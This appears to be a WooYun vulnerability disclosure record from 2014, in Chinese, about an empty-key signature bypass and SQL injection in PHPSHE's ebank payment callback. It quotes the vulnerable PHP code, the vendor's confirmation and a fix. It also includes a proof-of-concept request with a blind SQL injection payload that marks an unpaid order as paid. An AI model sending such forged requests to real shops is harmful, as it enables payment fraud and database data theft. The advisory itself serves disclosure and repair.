{"id": 50436, "wybug_id": "wooyun-2014-077823", "wybug_title": "PHPSHE SQL注入", "wybug_corp": "phpshe.com", "wybug_author": "zxx", "wybug_date": "2014-10-01 08:41", "wybug_open_date": "2014-12-30 08:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 默认配置验证绕过 详细说明：  /include/plugin/payway/ebank/Receive.php中ebank_md5 默认为空 ，可以生成sign绕过\ninclude('../../../../common.php');$cache_payway = cache::get('payway');$payway = unserialize($cache_payway['ebank']['payway_config']);$key   = $payway['ebank_md5']; //默认为空$v_oid     =trim($_POST['v_oid']);      $v_pmode   =trim($_POST['v_pmode']);      $v_pstatus =trim($_POST['v_pstatus']);      $v_pstring =trim($_POST['v_pstring']);      $v_amount  =trim($_POST['v_amount']);     $v_moneytype  =trim($_POST['v_moneytype']);     $remark1   =trim($_POST['remark1']);     $remark2   =trim($_POST['remark2']);     $v_md5str  =trim($_POST['v_md5str']); /** * 重新计算md5的值 */                           $md5string=strtoupper(md5($v_oid.$v_pstatus.$v_amount.$v_moneytype.$key));//之间连接生成md5，里面变量全可控/** * 判断返回信息，如果支付成功，并且支付结果可信，则做进一步的处理 */if ($v_md5str==$md5string) { //$_v_md5str也是可控\tif($v_pstatus==\"20\") {\t\t$info = $db->pe_select('order', array('order_id'=>$v_oid));//$v_oid未再验证。\t\tif ($info['order_state'] == 'notpay') {\t\t\t$order['order_outid'] = $v_pmode;\t\t\t$order['order_payway'] = 'ebank';\t\t\t$order['order_state'] = 'paid';\t\t\t$order['order_ptime'] = time();\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$v_oid), $order);\t\t\tpe_success('订单支付成功...');\t\t}\t}\telse {\t\techo \"支付失败\";\t}}\n   漏洞证明：  $md5string=strtoupper(md5($v_oid.$v_pstatus.$v_amount.$v_moneytype.$key));请求时，用这个生成一个 MD5字符串，作为$v_md5str传入，另v_pstatus为20。先生成一个订单，然后构造发生请求v_oid=1409290002' and substring(user(),1,1)=char(114) %23&v_pstatus=20&v_md5str=DEFD6AA06AA4104E7FBFE8507BB0A9D1判断数据库第一个位ascii码，如果是114，订单会支付成功。\n\n数据库更新成功\n\n显示\n\n假如判断是不是115，因为不是，所以\n\n\n\n没有进行更新操作，没有支付   修复方案：  像alipay的config里一样，配置一个长点的key，随机的   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-10-11 15:34 厂商回复： 感谢@zxx 提供代码审计，已将漏洞提交到技术部 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}